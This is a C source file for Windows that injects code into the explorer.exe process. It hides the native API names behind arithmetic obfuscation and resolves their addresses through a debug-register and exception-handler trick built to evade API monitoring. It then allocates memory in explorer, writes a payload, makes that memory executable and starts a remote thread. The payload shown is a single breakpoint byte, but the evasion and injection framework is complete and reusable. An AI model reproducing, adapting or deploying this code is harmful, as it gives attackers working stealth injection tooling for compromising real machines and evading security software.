#include <windows.h>
#include <time.h>
#include <winternl.h>
#include <pdh.h>
#include <pdhmsg.h>
#pragma comment(lib, "pdh.lib")


//below strings are arithmetic obfuscated. "ntdll.dll", "ntallocatevirtualmemory", "ntwritevirtualmemory", "ntprotectvirtualmemory", "rtlcreateuserthread"
char g_dll[] = {(((224-4)<<1)>>2), (((284|97)/3)-11), (((303+2)-5)/3), (((-209^212)+12)^107), (((161+7)^158)<<1), (((402+2)^228)>>3), (((208^214)+14)*5), (((29<<1)*2)-8), (((432>>3)*4)/2), 0};
char g_ntavm[] = {(((36*3)-15)-15), (((448>>1)+8)/2), (((36<<1)&246)+1), (((54*4)<<2)>>3), (((198-8)+5)^175), (((234^172)^152)/2), (((3946+14)>>3)/5), (((2479^183)>>3)/3), (((76>>2)+10)*4), (((465-5)/5)+9), (((81-3)+7)+1), (((138^232)-4)+11), (((27<<1)+3)*2), (((295<<1)/5)-2), (((152^237)-8)+8), (((321/3)-2)-8), (((2256>>3)/3)+14), (((160<<1)-12)/4), (((213-11)*2)/4), (((90^88)^119)-8), (((390^190)/3)+7), (((3651-3)>>3)/4), (((122&255)+14)-15), 0};
char g_ntwvm[] = {(((240^222)-7)<<1), (((108+8)-6)+6), (((1880-8)>>3)^189), (((23^203)>>1)+4), (((171+12)-2)^220), (((83<<2)>>1)^210), (((224^212)^148)^197), (((473+12)^189)>>2), (((134^239)<<2)>>2), (((990/3)/3)+4), (((125+14)-11)-12), (((189^200)<<2)/4), (((506+4)/5)-5), (((85^129)+4)/2), (((656>>2)>>1)-5), (((1210+2)/4)/3), (((94<<1)>>1)+15), (((162^115)+13)>>1), (((157^129)*4)+2), (((150^110)-6)/2), 0};
char g_ntpvm[] = {(((299+13)>>3)*2), (((278-14)|85)/3), (((335-10)-5)>>2), (((21^226)&108)+14), (((110/2)*2)+1), (((116-8)-4)+12), (((82*3)-9)&119), (((396<<3)>>2)>>3), (((916>>2)+3)>>1), (((45<<3)/5)+14), (((298+4)+13)/3), (((210^91)&247)-15), (((352>>3)-15)<<2), (((782+4)^186)>>3), (((136>>2)-11)^118), (((203+13)<<1)>>2), (((1488>>2)+13)/5), (((189-5)/2)+9), (((172+11)^207)-11), (((126-15)-4)+4), (((4560>>1)/4)/5), (((243^232)<<3)^161), 0};
char g_rtlcut[] = {(((82+9)+3)-12), (((231-13)>>1)+7), (((1784>>3)-7)/2), (((75*2)|65)&107), (((230^139)+2)+3), (((259|148)-3)>>2), (((152-13)^73)>>1), (((205&123)^112)^77), (((614/2)-4)/3), (((7328>>3)>>2)^176), (((456/4)+11)-10), (((916-12)>>3)-12), (((293-8)/5)*2), (((135-3)>>2)^117), (((46*2)+1)+11), (((368+13)/3)-13), (((196+7)^160)-6), (((1184>>3)^86)>>1), (((60*4)^194)<<1), 0};

#ifndef _WIN64
typedef LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef NTSTATUS(NTAPI* fn_NtAVM)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* fn_NtWVM)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* fn_NtPVM)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* fn_RTLCUT)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PSIZE_T, PSIZE_T, PVOID, PVOID, PHANDLE, PVOID);

struct RuntimeKeyData { 
    DWORD_PTR key; 
    DWORD_PTR salt; 
};

DWORD_PTR g_DiscoveredAddress = 0;
bool g_HandlerCalled = false;

struct DebugRegInfo { 
    int mainRegister; 
    DWORD_PTR encryptedAddr; 
    RuntimeKeyData keyData; 
};

DebugRegInfo g_DebugInfo = {0, 0, {0, 0}};

RuntimeKeyData GenerateRuntimeKey() {
    RuntimeKeyData data = {0, 0};
    DWORD_PTR timeVal = (DWORD_PTR)GetTickCount64(), 
             procId = (DWORD_PTR)GetCurrentProcessId(), 
             threadId = (DWORD_PTR)GetCurrentThreadId();
    void* stackPtr = nullptr;
#ifdef _WIN64
    stackPtr = (void*)__readgsqword(0x8);
#else
    stackPtr = (void*)__readfsdword(0x4);
#endif
    data.salt = (((DWORD_PTR)stackPtr >> 4) ^ (procId << 12) ^ (threadId >> 3) ^ (timeVal * 0x1234567));
    SYSTEM_INFO sysInfo; 
    GetSystemInfo(&sysInfo);
    data.key = (data.salt ^ ((DWORD_PTR)sysInfo.lpMinimumApplicationAddress) ^ 
               ((DWORD_PTR)GetModuleHandleA(NULL)) ^ (timeVal ^ procId ^ threadId));
    
    for(int i = 0; i < (timeVal & 0xF); i++) { 
        data.key = _rotl64(data.key, 7) ^ data.salt; 
        data.salt = _rotl64(data.salt, 13) ^ data.key; 
    }
    return data;
}

LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        g_HandlerCalled = true;
#ifdef _WIN64
        DWORD_PTR faultingAddress = pExceptionInfo->ContextRecord->Rip;
#else
        DWORD_PTR faultingAddress = pExceptionInfo->ContextRecord->Eip;
#endif
        g_DiscoveredAddress = faultingAddress ^ g_DebugInfo.keyData.key ^ g_DebugInfo.keyData.salt;
        pExceptionInfo->ContextRecord->Dr0 = 0;
        pExceptionInfo->ContextRecord->Dr1 = 0;
        pExceptionInfo->ContextRecord->Dr2 = 0;
        pExceptionInfo->ContextRecord->Dr3 = 0;
        pExceptionInfo->ContextRecord->Dr7 = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

FARPROC StealthGetProcAddress(HMODULE hModule, LPCSTR lpProcName) { //Stealth dyn func address enum using obf debug registers and runtime key encryption
    g_DiscoveredAddress = 0;
    g_HandlerCalled = false;
    g_DebugInfo.keyData = GenerateRuntimeKey();
    
    FARPROC actualAddr = GetProcAddress(hModule, lpProcName);
    if (!actualAddr) return NULL;
    
    srand((unsigned)time(NULL) ^ GetCurrentProcessId() ^ g_DebugInfo.keyData.salt);
    g_DebugInfo.mainRegister = rand() % 4;
    
    PVOID handler = AddVectoredExceptionHandler(1, VectoredHandler);
    if (!handler) return NULL;
    
    HANDLE hThread = GetCurrentThread();
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_ALL;
    
    if (!GetThreadContext(hThread, &ctx)) { 
        RemoveVectoredExceptionHandler(handler); 
        return NULL; 
    }
    
    DWORD_PTR realAddr = (DWORD_PTR)actualAddr;
    DWORD dr7 = 0;
    
    for(int i = 0; i < 4; i++) {
        DWORD_PTR addr;
        if(i == g_DebugInfo.mainRegister) {
            addr = realAddr;
        } else {
            DWORD_PTR offset = (g_DebugInfo.keyData.salt >> (i * 8)) & 0xFFF;
            addr = realAddr + ((offset ^ (g_DebugInfo.keyData.key & 0xFFF)) & 0x1FFF);
        }
        switch(i) {
            case 0: ctx.Dr0 = addr; break;
            case 1: ctx.Dr1 = addr; break;
            case 2: ctx.Dr2 = addr; break;
            case 3: ctx.Dr3 = addr; break;
        }
        dr7 |= (1 << (i * 2));
        dr7 |= (0 << (16 + i * 4));
        dr7 |= (0 << (17 + i * 4));
    }
    ctx.Dr7 = dr7;
    
    if (!SetThreadContext(hThread, &ctx)) { 
        RemoveVectoredExceptionHandler(handler); 
        return NULL; 
    }

    if (strcmp(lpProcName, g_ntavm) == 0) {
        typedef NTSTATUS(NTAPI* fn_Test)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
        fn_Test testCall = (fn_Test)actualAddr;
        PVOID baseAddr = NULL;
        SIZE_T regionSize = 0x1000;
        testCall(GetCurrentProcess(), &baseAddr, 0, &regionSize, MEM_RESERVE, PAGE_READWRITE);
    }
    else if (strcmp(lpProcName, g_ntwvm) == 0) {
        typedef NTSTATUS(NTAPI* fn_Test)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        fn_Test testCall = (fn_Test)actualAddr;
        char testBuf[1] = {0};
        SIZE_T written = 0;
        testCall(GetCurrentProcess(), (PVOID)0x1000, testBuf, sizeof(testBuf), &written);
    }
    else if (strcmp(lpProcName, g_ntpvm) == 0) {
        typedef NTSTATUS(NTAPI* fn_Test)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
        fn_Test testCall = (fn_Test)actualAddr;
        PVOID addr = (PVOID)0x1000;
        SIZE_T size = 0x1000;
        ULONG oldProtect = 0;
        testCall(GetCurrentProcess(), &addr, &size, PAGE_READONLY, &oldProtect);
    }
    else if (strcmp(lpProcName, g_rtlcut) == 0) {
        typedef NTSTATUS(NTAPI* fn_Test)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, 
                                        PSIZE_T, PSIZE_T, PVOID, PVOID, PHANDLE, PVOID);
        fn_Test testCall = (fn_Test)actualAddr;
        HANDLE hThread = NULL;
        testCall(GetCurrentProcess(), NULL, TRUE, 0, NULL, NULL, NULL, NULL, &hThread, NULL);
    }
    
    RemoveVectoredExceptionHandler(handler);
    if (g_HandlerCalled && g_DiscoveredAddress) 
        return (FARPROC)(g_DiscoveredAddress ^ g_DebugInfo.keyData.key ^ g_DebugInfo.keyData.salt);
    return NULL;
}

DWORD FindExplorerPID() { // PDH counter used to find pid of explorer - bettr than enumproc or snapshot
    PDH_STATUS status;
    PDH_HQUERY query;
    PDH_HCOUNTER counter;
    DWORD counterType;
    PDH_FMT_COUNTERVALUE value;
    DWORD pid = 0;
    
    if (PdhOpenQuery(NULL, 0, &query) != ERROR_SUCCESS) return 0;
    if (PdhAddCounter(query, TEXT("\\Process(explorer)\\ID Process"), 0, &counter) != ERROR_SUCCESS) {
        PdhCloseQuery(query);
        return 0;
    }
    if (PdhCollectQueryData(query) != ERROR_SUCCESS) {
        PdhCloseQuery(query);
        return 0;
    }
    Sleep(100);
    if (PdhGetFormattedCounterValue(counter, PDH_FMT_LONG, &counterType, &value) != ERROR_SUCCESS) {
        PdhCloseQuery(query);
        return 0;
    }
    pid = value.longValue;
    PdhCloseQuery(query);
    return pid;
}

bool InjectBreakpoint(DWORD pid, fn_NtAVM NtAllocVirtMem, 
    fn_NtWVM NtWriteVirtMem, fn_NtPVM NtProtectVirtMem,
    fn_RTLCUT RtlCreateThread) {
    
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD, FALSE, pid);
    if (!hProcess) return false;

    PVOID baseAddr = NULL;
    SIZE_T regionSize = 0x1000;
    if (!NT_SUCCESS(NtAllocVirtMem(hProcess, &baseAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
        CloseHandle(hProcess);
        return false;
    }

    unsigned char breakpoint = 0xCC;
    SIZE_T bytesWritten;
    if (!NT_SUCCESS(NtWriteVirtMem(hProcess, baseAddr, &breakpoint, sizeof(breakpoint), &bytesWritten))) {
        CloseHandle(hProcess);
        return false;
    }

    ULONG oldProtect;
    if (!NT_SUCCESS(NtProtectVirtMem(hProcess, &baseAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect))) {
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hNewThread;
    if (!NT_SUCCESS(RtlCreateThread(hProcess, NULL, FALSE, 0, NULL, NULL, baseAddr, NULL, &hNewThread, NULL))) {
        CloseHandle(hProcess);
        return false;
    }

    CloseHandle(hNewThread);
    CloseHandle(hProcess);
    return true;
}

int main() { // Main workflow: ntdll -> api funcs -> target proc -> inject + exec
    HMODULE hNtdll = GetModuleHandleA(g_dll);
    if (!hNtdll) return 1;

    FARPROC addr_NtAllocateVirtualMemory = StealthGetProcAddress(hNtdll, g_ntavm);
    if (!addr_NtAllocateVirtualMemory) return 1;
    fn_NtAVM NtAllocateVirtualMemoryFunc = (fn_NtAVM)addr_NtAllocateVirtualMemory;

    FARPROC addr_NtWriteVirtualMemory = StealthGetProcAddress(hNtdll, g_ntwvm);
    if (!addr_NtWriteVirtualMemory) return 1;
    fn_NtWVM NtWriteVirtualMemoryFunc = (fn_NtWVM)addr_NtWriteVirtualMemory;

    FARPROC addr_NtProtectVirtualMemory = StealthGetProcAddress(hNtdll, g_ntpvm);
    if (!addr_NtProtectVirtualMemory) return 1;
    fn_NtPVM NtProtectVirtualMemoryFunc = (fn_NtPVM)addr_NtProtectVirtualMemory;

    FARPROC addr_RtlCreateUserThread = StealthGetProcAddress(hNtdll, g_rtlcut);
    if (!addr_RtlCreateUserThread) return 1;
    fn_RTLCUT RtlCreateUserThreadFunc = (fn_RTLCUT)addr_RtlCreateUserThread;
    
    DWORD explorerPID = FindExplorerPID();
    if (!explorerPID) return 1;
    
    InjectBreakpoint(explorerPID, NtAllocateVirtualMemoryFunc, NtWriteVirtualMemoryFunc, 
        NtProtectVirtualMemoryFunc, RtlCreateUserThreadFunc);
    return 0;
}
